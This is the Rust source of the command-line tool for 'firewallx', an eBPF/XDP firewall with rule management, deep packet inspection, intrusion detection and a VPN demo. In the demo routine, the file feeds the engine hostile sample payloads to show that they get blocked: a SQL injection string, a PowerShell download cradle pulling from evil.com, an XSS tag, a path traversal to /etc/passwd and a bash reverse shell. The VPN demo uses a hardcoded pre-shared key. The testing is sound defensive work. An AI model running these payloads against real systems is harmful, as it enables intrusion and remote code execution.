use clap::{Parser, Subcommand};
use firewallx::{
    FirewallEngine, Packet, Protocol, Direction,
    Rule, Action, RuleSet,
    DpiEngine,
    IdsEngine, AlertKind,
    VpnGateway, PeerConfig, CipherSuite, AuthMethod,
};
use firewallx::modules::engine::EngineConfig;
use firewallx::config::FirewallConfig;
use std::net::Ipv4Addr;
use std::fs;
use std::path::Path;
use aya::{Bpf, programs::{Xdp, XdpFlags}, maps::HashMap as AyaHashMap};

#[derive(Parser)]
#[command(name = "firewallx", version = "0.2.0", about = "Programmable eBPF Firewall")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Start the firewall engine
    Start,
    /// Install the systemd service and default config
    Install,
    /// Manage firewall rules
    Rule {
        #[command(subcommand)]
        action: RuleAction,
    },
}

#[derive(Subcommand)]
enum RuleAction {
    /// Add a new rule
    Add {
        #[arg(long)]
        name: String,
        #[arg(short, long)]
        action: String,
        #[arg(long)]
        port: Option<u16>,
        #[arg(long, default_value = "tcp")]
        protocol: String,
        #[arg(long, default_value = "inbound")]
        direction: String,
    },
    /// List all rules
    List,
}

const CONFIG_PATH: &str = "/etc/firewallx/config.toml";

fn separator(title: &str) {
    println!("\n{}", "═".repeat(60));
    println!("  {}", title);
    println!("{}", "═".repeat(60));
}

fn main() -> Result<(), anyhow::Error> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Install => {
            install_firewall()?;
        }
        Commands::Rule { action } => {
            manage_rules(action)?;
        }
        Commands::Start => {
            start_firewall()?;
        }
    }
    Ok(())
}

fn install_firewall() -> Result<(), anyhow::Error> {
    println!("Installing FirewallX configuration...");
    if !Path::new("/etc/firewallx").exists() {
        // If we don't have sudo, this might fail, but users should run --install as root
        if let Err(e) = fs::create_dir_all("/etc/firewallx") {
            println!("Could not create /etc/firewallx. Ensure you are running as root. Error: {}", e);
            return Ok(());
        }
    }
    
    let config = FirewallConfig::default();
    config.save_to_file(CONFIG_PATH)?;
    println!("Created default configuration at {}", CONFIG_PATH);
    
    println!("Run `firewallx start` to begin protecting your network.");
    Ok(())
}

fn manage_rules(action: RuleAction) -> Result<(), anyhow::Error> {
    let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        println!("Warning: Could not read config at {}. Using an empty in-memory config to list/add.", CONFIG_PATH);
        FirewallConfig::default()
    });
    
    match action {
        RuleAction::Add { name, action, port, protocol, direction } => {
            let act = match action.to_lowercase().as_str() {
                "allow" => Action::Allow,
                "drop" => Action::Drop,
                "reject" => Action::Reject,
                _ => anyhow::bail!("Invalid action. Use allow, drop, or reject."),
            };
            
            let proto = match protocol.to_lowercase().as_str() {
                "tcp" => Protocol::Tcp,
                "udp" => Protocol::Udp,
                "icmp" => Protocol::Icmp,
                _ => Protocol::Any,
            };
            
            let dir = match direction.to_lowercase().as_str() {
                "inbound" => Direction::Inbound,
                "outbound" => Direction::Outbound,
                _ => Direction::Inbound,
            };
            
            let id = config.ruleset.rules.len() as u32 + 1;
            let rule = Rule::new(id, &name, act, None, None, port, proto, dir);
            config.ruleset.add(rule);
            config.save_to_file(CONFIG_PATH)?;
            println!("Rule '{}' added successfully.", name);
        }
        RuleAction::List => {
            println!("{:<5} | {:<15} | {:<10} | {:<8} | {:<10} | {:<10}", 
                "ID", "Name", "Action", "Port", "Protocol", "Direction");
            println!("{}", "-".repeat(65));
            for r in &config.ruleset.rules {
                let port_str = r.dst_port.map(|p| p.to_string()).unwrap_or_else(|| "*".to_string());
                println!("{:<5} | {:<15} | {:<10?} | {:<8} | {:<10?} | {:<10?}", 
                    r.id, r.name, r.action, port_str, r.protocol, r.direction);
            }
        }
    }
    Ok(())
}

fn start_firewall() -> Result<(), anyhow::Error> {
    separator("System Setup");
    println!("Loading configuration from {}...", CONFIG_PATH);
    
    let config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        println!("Warning: Could not read config at {}, using default simulated rules from v0.1.", CONFIG_PATH);
        let mut cfg = FirewallConfig::default();
        cfg.ruleset.add(Rule::new(1, "Allow SSH", Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound));
        cfg.ruleset.add(Rule::new(2, "Allow HTTPS", Action::Allow, None, None, Some(443), Protocol::Tcp, Direction::Outbound));
        cfg.ruleset.add(Rule::new(3, "Allow HTTP", Action::Allow, None, None, Some(80), Protocol::Tcp, Direction::Inbound));
        cfg.ruleset.add(Rule::new(999, "Default deny", Action::Drop, None, None, None, Protocol::Any, Direction::Inbound));
        cfg
    });

    println!("Loading eBPF Kernel Program...");
    let mut bpf_opt = None;
    let bpf_paths = [
        "../target/bpfel-unknown-none/release/firewallx-ebpf", 
        "target/bpfel-unknown-none/release/firewallx-ebpf",    
        "/usr/lib/firewallx/firewallx-ebpf",
    ];
    
    for path in bpf_paths {
        if let Ok(mut bpf) = Bpf::load_file(path) {
            if let Some(program) = bpf.program_mut("firewallx_ebpf") {
                let program: &mut Xdp = match program.try_into() {
                    Ok(p) => p,
                    Err(_) => continue,
                };
                if program.load().is_ok() {
                    // Attach to loopback for demo
                    if program.attach("lo", XdpFlags::default()).is_ok() {
                        println!("eBPF attached to 'lo' interface successfully! Line-rate blocking active.");
                        bpf_opt = Some(bpf);
                        break;
                    }
                }
            }
        }
    }
    
    if bpf_opt.is_none() {
        println!("Warning: eBPF kernel program not loaded. Running in standard userspace mode.");
        println!("Note: eBPF hooks require execution on a Linux environment as root.");
    }

    separator("1 · FirewallEngine (stateful + rules + DPI + IDS)");

    // Start Engine
    let mut engine = FirewallEngine::with_config(config.ruleset, EngineConfig::default(), config.ids);

    let http_pkt = Packet::new(
        Ipv4Addr::new(203,0,113,1), Ipv4Addr::new(10,0,0,1),
        54321, 80, Protocol::Tcp, Direction::Inbound, 128,
    );

    let d = engine.process_with_payload(&http_pkt, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n");
    println!("[HTTP  clean ] {:?}", d);
    let d = engine.process_with_payload(&http_pkt, b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1\r\n");
    println!("[HTTP  SQLi  ] {:?}  <- DPI blocked", d);
    let d = engine.process_with_payload(&http_pkt, b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");
    println!("[HTTP  PS    ] {:?}  <- DPI blocked", d);

    let ssh_pkt = Packet::new(Ipv4Addr::new(203,0,113,5), Ipv4Addr::new(10,0,0,1), 60000, 22, Protocol::Tcp, Direction::Inbound, 64);
    let d = engine.process_with_payload(&ssh_pkt, b"SSH-2.0-OpenSSH_8.9p1");
    println!("[SSH   clean ] {:?}", d);

    let rdp_pkt = Packet::new(Ipv4Addr::new(8,8,8,8), Ipv4Addr::new(10,0,0,1), 1234, 3389, Protocol::Tcp, Direction::Inbound, 0);
    let d = engine.process(&rdp_pkt);
    println!("[RDP   inbnd ] {:?}  <- default deny", d);

    let s = engine.stats();
    println!("\nStats → total:{} allowed:{} dropped:{} dpi_blocked:{} ips_blocked:{}",
        s.total, s.allowed, s.dropped, s.dpi_blocked, s.ips_blocked);

    separator("2 · DPI Engine — payload inspection");

    let mut dpi = DpiEngine::new();
    let samples: &[(&str, &[u8])] = &[
        ("ELF binary",     b"\x7fELF\x02\x01\x01\x00"),
        ("XSS attempt",    b"<script>alert('xss')</script>"),
        ("Path traversal", b"GET /../../../etc/passwd HTTP/1.1"),
        ("Bash rev shell", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ];
    println!("{:<18} {:<12} {:<10} {}", "Sample", "Protocol", "Blocked", "Sig IDs");
    println!("{}", "-".repeat(60));
    for (label, payload) in samples {
        let r = dpi.inspect(payload);
        let sigs: Vec<_> = r.matches.iter().map(|m| m.sig_id.to_string()).collect();
        println!("{:<18} {:<12} {:<10} {}", label, r.app_protocol.to_string(), r.blocked, sigs.join(", "));
    }

    separator("3 · IDS/IPS — behavioural detection");

    let mut ids = engine.ids_mut();
    let attacker = Ipv4Addr::new(6,6,6,6);
    println!("Port scan from {}...", attacker);
    for port in [22u16, 80, 443, 3306, 5432, 8080] {
        let pkt = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 9000, port, Protocol::Tcp, Direction::Inbound, 0);
        for a in ids.inspect(&pkt) {
            println!("  ALERT [{:?}] {}", a.kind, a.description);
            if a.kind == AlertKind::BlacklistedIp {
                if let Some(ref mut bpf) = bpf_opt {
                    if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
                        let ip_key = u32::from_be_bytes(attacker.octets());
                        let _ = blocklist.insert(ip_key, 1u8, 0);
                        println!("  [eBPF] Attacker {} added to hardware kernel blocklist!", attacker);
                    }
                }
            }
        }
    }
    println!("Total alerts: {}", ids.total_alerts());

    separator("4 · VPN Gateway — tunnel lifecycle");

    let mut vpn = VpnGateway::new();
    let remote = Ipv4Addr::new(203, 0, 113, 100);
    vpn.add_peer(PeerConfig::new(remote, CipherSuite::Aes256Gcm, AuthMethod::PreSharedKey)
            .with_psk("super_secret_key")
            .with_network("10.20.0.0/16".parse().unwrap()));
    let tid = vpn.initiate(remote).unwrap();
    vpn.complete_handshake(tid, Some("super_secret_key")).unwrap();
    println!("Tunnel #{} established with {}", tid, remote);
    println!("Active tunnels: {}", vpn.active_tunnel_count());

    separator("FirewallX CLI — Engine operational");
    
    println!("\n[DEMO] Engine and eBPF hook are initialized.");
    println!("We are now dropping 127.0.0.1 queries in the eBPF hardware blocklist.");
    if let Some(ref mut bpf) = bpf_opt {
        if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
            let localhost = Ipv4Addr::new(127, 0, 0, 1);
            let ip_key = u32::from_be_bytes(localhost.octets());
            let _ = blocklist.insert(ip_key, 1u8, 0);
        }
    }
    
    println!("Run `docker exec -it <container> ping localhost` in another terminal to test XDP drops.");
    
    // In a real firewall, we'd start a packet loop via AF_PACKET/Raw Socket here.
    // Park the thread to keep the engine & eBPF hooks alive.
    std::thread::park();
    Ok(())
}
